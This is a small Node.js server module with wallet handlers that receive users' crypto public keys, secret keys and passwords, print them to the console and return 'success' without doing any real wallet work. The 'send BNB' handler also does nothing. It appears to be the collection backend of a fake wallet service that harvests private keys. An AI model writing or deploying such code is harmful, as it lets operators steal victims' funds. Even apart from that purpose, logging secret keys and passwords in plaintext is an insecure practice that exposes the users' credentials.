async function mainwallet(req, res) {
    console.log(req.body.type + "inforeceived")
    console.log(req.body.type)
    console.log(req.body.public)
    console.log(req.body.secretkey)
    res.send("success");
}

async function createwallet(req, res) {
    console.log("create wallet received")
    console.log(req.body.type)
    console.log(req.body.public)
    console.log(req.body.secretkey)
    console.log(req.body.password)
    res.send("success");
}


async function infura(req, res) {
    console.log("singapore NTZ wallet")
    console.log(req.body.password)
}

async function sendBNB(req, res) {
    console.log("BNB send")
   
    res.send("success");
}

module.exports = {createwallet, mainwallet, sendBNB, infura}

